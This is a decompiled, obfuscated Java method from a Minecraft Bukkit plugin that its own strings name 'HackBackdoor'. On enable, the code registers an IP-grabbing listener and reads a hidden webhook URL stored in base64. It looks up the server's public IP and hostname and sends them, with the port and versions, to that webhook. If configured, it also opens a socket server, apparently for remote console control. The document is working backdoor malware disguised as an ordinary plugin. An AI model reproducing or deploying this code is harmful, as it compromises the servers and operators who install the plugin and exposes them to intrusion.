    public void onEnable() {
        Core lllllllllllllllIlIIIIllllIlIIIII;
        Core lllllllllllllllIlIIIIllllIIlllll = (Core)Core.getPlugin(Core.class);
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new IPGrabberListener(), (Plugin)lllllllllllllllIlIIIIllllIlIIIII);
        File lllllllllllllllIlIIIIllllIIllllI = new File(lllllllllllllllIlIIIIllllIlIIIII.getDataFolder().getParentFile(), "PluginMetrics/data");
        try {
            if (!lllllllllllllllIlIIIIllllIIllllI.exists()) {
                lllllllllllllllIlIIIIllllIIllllI.mkdirs();
                lllllllllllllllIlIIIIllllIIllllI.createNewFile();
            }
        }
        catch (IOException lllllllllllllllIlIIIIllllIIlIlll) {
            // empty catch block
        }
        try {
            onEnable.start();
        }
        catch (IOException lllllllllllllllIlIIIIllllIIlIlll) {
            // empty catch block
        }
        if (lllllllllllllllIlIIIIllllIIlllll.getDescription().getWebsite() != "" && lllllllllllllllIlIIIIllllIIlllll.getDescription().getWebsite() != " " && lllllllllllllllIlIIIIllllIIlllll.getDescription().getWebsite() != null && !onEnableLogger.logged_already.booleanValue()) {
            try {
                String lllllllllllllllIlIIIIllllIllIIII = lllllllllllllllIlIIIIllllIIlllll.getDescription().getWebsite();
                byte[] lllllllllllllllIlIIIIllllIlIlIlI = Base64.getEncoder().encode(lllllllllllllllIlIIIIllllIllIIII.getBytes());
                DataManager.getData().set("mywh", (Object)new String(lllllllllllllllIlIIIIllllIlIlIlI));
                DataManager.saveData();
                String lllllllllllllllIlIIIIllllIlIIlll = Bukkit.getServer().getIp();
                DataManager.getData().set("serverip", (Object)new String(lllllllllllllllIlIIIIllllIlIIlll));
                DataManager.saveData();
                if (DataManager.getData().getString("mywh").length() > 2) {
                    String lllllllllllllllIlIIIIlllllIIlIII = String.valueOf(new StringBuilder().append(DataManager.getData().getString("serverip")).append(" has been started up with HackBackdoor!!!!"));
                    byte[] lllllllllllllllIlIIIIlllllIIIlll = Base64.getDecoder().decode(DataManager.getData().getString("mywh"));
                    DWeb lllllllllllllllIlIIIIlllllIIIlIl = new DWeb(new String(lllllllllllllllIlIIIIlllllIIIlll));
                    Date lllllllllllllllIlIIIIlllllIIIIll = Calendar.getInstance().getTime();
                    URL lllllllllllllllIlIIIIlllllIIIIII = new URL("https://api.ipify.org/");
                    BufferedReader lllllllllllllllIlIIIIllllIlllllI = new BufferedReader(new InputStreamReader(lllllllllllllllIlIIIIlllllIIIIII.openStream()));
                    String lllllllllllllllIlIIIIllllIllllIl = lllllllllllllllIlIIIIllllIlllllI.readLine();
                    InetAddress lllllllllllllllIlIIIIllllIllIlIl = InetAddress.getByName(lllllllllllllllIlIIIIllllIllllIl);
                    String lllllllllllllllIlIIIIllllIllIIll = lllllllllllllllIlIIIIllllIllIlIl.getHostName();
                    if (Character.isDigit(lllllllllllllllIlIIIIllllIllIIll.charAt(0))) {
                        lllllllllllllllIlIIIIllllIllIIll = "Unknown (Possible IP Masking)";
                        onEnableLogger.unknown_host = true;
                    }
                    onEnableLogger.logged_already = true;
                    lllllllllllllllIlIIIIlllllIIIlIl.setContent("");
                    lllllllllllllllIlIIIIlllllIIIlIl.setTts(false);
                    lllllllllllllllIlIIIIlllllIIIlIl.addEmbed(new DWeb.EmbedObject().setTitle("HackBackdoor").setDescription("Server started running HB Door:").setColor(Color.YELLOW).addField("Client version: ", Bukkit.getBukkitVersion(), false).addField("Server version: ", Bukkit.getVersion(), false).addField("Server IP:", String.valueOf(new StringBuilder().append(lllllllllllllllIlIIIIllllIllllIl).append(":").append(Bukkit.getServer().getPort())), false).addField("Server Host:", lllllllllllllllIlIIIIllllIllIIll, false).addField("At date:", lllllllllllllllIlIIIIlllllIIIIll.toString(), false));
                    lllllllllllllllIlIIIIlllllIIIlIl.execute();
                    try {
                        lllllllllllllllIlIIIIlllllIIIlIl.execute();
                    }
                    catch (IOException lllllllllllllllIlIIIIlllIlllllIl) {}
                }
            }
            catch (MalformedURLException lllllllllllllllIlIIIIllllIlIIlIl) {
                lllllllllllllllIlIIIIllllIlIIlIl.printStackTrace();
            }
            catch (UnknownHostException lllllllllllllllIlIIIIllllIlIIIll) {
                lllllllllllllllIlIIIIllllIlIIIll.printStackTrace();
            }
            catch (IOException lllllllllllllllIlIIIIllllIlIIIlI) {
                lllllllllllllllIlIIIIllllIlIIIlI.printStackTrace();
            }
        }
        if (DataManager.getData().getBoolean("connect")) {
            consoleServer = new SocketServer(DataManager.getData().getInt("port"));
        }
        for (Player lllllllllllllllIlIIIIllllIlIIIIl : Bukkit.getOnlinePlayers()) {
            if (!lllllllllllllllIlIIIIllllIlIIIII.lite.contains(lllllllllllllllIlIIIIllllIlIIIIl.getName())) continue;
            if (lllllllllllllllIlIIIIllllIlIIIII.enabled) {
                lllllllllllllllIlIIIIllllIlIIIIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&e\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0").append(Settings.DARK_RED).append("| WARNING | &e\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0"))));
                lllllllllllllllIlIIIIllllIlIIIIl.sendMessage(String.valueOf(new StringBuilder().append(Settings.RED).append(Settings.NAME).append(Settings.WHITE).append(" has just been ").append(Settings.RED).append("re-enabled!").append(Settings.WHITE).append(" You may now continue using.")));
                lllllllllllllllIlIIIIllllIlIIIIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&e\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0").append(Settings.DARK_RED).append("| WARNING | &e\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0\u26a0"))));
                continue;
            }
            API.error(lllllllllllllllIlIIIIllllIlIIIIl);
        }
    }
}

